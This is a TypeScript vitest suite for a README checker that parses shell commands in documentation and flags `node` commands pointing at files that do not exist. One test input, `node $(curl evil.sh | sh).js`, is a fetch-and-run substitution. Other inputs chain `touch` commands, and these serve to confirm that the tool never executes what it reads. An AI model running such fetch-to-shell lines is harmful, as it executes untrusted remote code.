import { afterEach, describe, expect, it } from "vitest";
import { nodeScriptPath } from "../src/checks/commands";
import { commandsFromBlock, commandsFromInline, splitCommandLine } from "../src/shell";
import { byRule, check, cleanupRepos } from "./helpers";

afterEach(cleanupRepos);

describe("splitCommandLine", () => {
  it("splits on operators and honours quotes", () => {
    expect(splitCommandLine("npm ci && npm run build; node 'my file.js' | cat")).toEqual([
      ["npm", "ci"],
      ["npm", "run", "build"],
      ["node", "my file.js"],
      ["cat"],
    ]);
  });

  it("drops redirections, comments, env assignments and sudo", () => {
    expect(splitCommandLine("NODE_ENV=production node server.js > out.log 2>&1")).toEqual([["node", "server.js"]]);
    expect(splitCommandLine("npm test # runs the suite")).toEqual([["npm", "test"]]);
    expect(splitCommandLine("sudo npm install")).toEqual([["npm", "install"]]);
  });

  it("returns nothing for unbalanced quotes and never evaluates substitutions", () => {
    expect(splitCommandLine("echo 'oops")).toEqual([]);
    expect(splitCommandLine("node $(curl evil.sh | sh).js")[0]).toContain("$(curl");
  });
});

describe("commandsFromBlock", () => {
  it("joins backslash continuations and strips prompts", () => {
    const cmds = commandsFromBlock("$ npm run build \\\n    --verbose\npnpm dev", "bash");
    expect(cmds.map((c) => [c.tokens.join(" "), c.lineOffset])).toEqual([
      ["npm run build --verbose", 0],
      ["pnpm dev", 2],
    ]);
  });

  it("in console blocks only reads lines that have a prompt", () => {
    const cmds = commandsFromBlock("$ npm test\nnpm ERR! missing script", "console");
    expect(cmds.map((c) => c.tokens.join(" "))).toEqual(["npm test"]);
  });

  it("tracks cd into a repository directory", () => {
    expect(commandsFromBlock("cd web\nnpm run x", "sh")).toMatchObject([{ tokens: ["npm", "run", "x"], cwd: "web" }]);
    expect(commandsFromBlock("cd web && cd ../api\nnpm test", "sh")).toMatchObject([{ cwd: "api" }]);
    expect(commandsFromBlock("npm ci\ncd packages/a\nnpm test", "sh").map((c) => c.cwd)).toEqual([".", "packages/a"]);
  });

  it("stops when the directory cannot be known statically", () => {
    for (const block of ["cd ~/x\nnpm run x", "cd /opt/app\nnpm run x", "cd $HOME\nnpm run x", "cd ../..\nnpm run x", "cd\nnpm run x", "cd a\npopd\nnpm run x"]) {
      expect(commandsFromBlock(block, "sh")).toEqual([]);
    }
  });

  it("does not move after cloning and entering the repository", () => {
    const cmds = commandsFromBlock("git clone https://example.com/a/b.git\ncd b\nnpm install", "sh");
    expect(cmds.map((c) => [c.tokens[0], c.cwd])).toEqual([["git", "."], ["npm", "."]]);
  });

  it("skips comment lines", () => {
    expect(commandsFromBlock("# npm run nope\nnpm test", "sh").map((c) => c.tokens.join(" "))).toEqual(["npm test"]);
  });

  it("inline code is a command only for known tools", () => {
    expect(commandsFromInline("pnpm build")).toEqual([["pnpm", "build"]]);
    expect(commandsFromInline("build")).toEqual([]);
    expect(commandsFromInline("yarn")).toEqual([]);
    expect(commandsFromInline("npm")).toEqual([]);
    expect(commandsFromInline("some-tool run x")).toEqual([]);
  });
});

describe("nodeScriptPath", () => {
  it("finds the script and skips flags", () => {
    expect(nodeScriptPath(["node", "server.js"])).toBe("server.js");
    expect(nodeScriptPath(["node", "--require", "dotenv/config", "src/app.mjs", "--port", "3"])).toBe("src/app.mjs");
    expect(nodeScriptPath(["node", "--max-old-space-size=4096", "./bin/cli.ts"])).toBe("./bin/cli.ts");
  });

  it("ignores eval, directories, variables and absolute paths", () => {
    for (const tokens of [["node", "-e", "console.log(1)"], ["node", "."], ["node", "src"], ["node", "$FILE.js"], ["node", "/usr/lib/x.js"], ["npm", "start"]]) {
      expect(nodeScriptPath(tokens)).toBeUndefined();
    }
  });
});

describe("node file commands", () => {
  it("reports a missing file referenced by node", async () => {
    const report = await check({ "README.md": "Start it:\n\n```bash\nnode server.js\n```\n" });
    expect(byRule(report.findings, "commands")).toMatchObject([
      { severity: "error", file: "README.md", line: 4, message: 'README.md runs "node server.js", but server.js does not exist.', subject: "server.js" },
    ]);
  });

  it("accepts an existing file and normalizes ./ paths", async () => {
    const report = await check({ "README.md": "```bash\nnode server.js\nnode ./src/cli.js --help\n```", "server.js": "", "src/cli.js": "" });
    expect(byRule(report.findings, "commands")).toHaveLength(0);
  });

  it("does not flag build output such as dist/", async () => {
    const report = await check({ "README.md": "```bash\nnpm run build && node dist/index.js\n```" });
    expect(byRule(report.findings, "commands")).toHaveLength(0);
  });

  it("never executes documented commands", async () => {
    const marker = `/tmp/doceye-should-not-exist-${process.pid}`;
    await check({
      "README.md": `\`\`\`bash\nnode server.js; touch ${marker}\nnpm run x && touch ${marker}\n\`\`\`\n\nRun \`npm run \$(touch ${marker})\`\n`,
      "package.json": JSON.stringify({ scripts: { x: `touch ${marker}` } }),
    });
    const { existsSync } = await import("node:fs");
    expect(existsSync(marker)).toBe(false);
  });
});
